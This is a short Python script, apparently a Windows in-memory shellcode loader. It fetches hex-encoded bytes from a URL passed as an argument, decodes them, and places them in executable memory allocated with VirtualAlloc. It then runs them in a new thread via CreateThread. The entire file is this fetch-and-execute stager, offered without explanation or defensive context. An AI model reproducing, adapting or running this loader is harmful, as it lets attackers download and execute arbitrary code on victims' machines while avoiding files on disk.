import ctypes
import sys
import requests

r = requests.get(sys.argv[1])
text = r.text
textok = text.replace('\n','').replace('\r','')
daima = bytearray(textok.decode("hex"))
whatptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(daima)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))
 
buf = (ctypes.c_char * len(daima)).from_buffer(daima)
 
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(whatptr),
                                     buf,
                                     ctypes.c_int(len(daima)))
 
ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.c_int(whatptr),
                                         ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.pointer(ctypes.c_int(0)))
 
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))


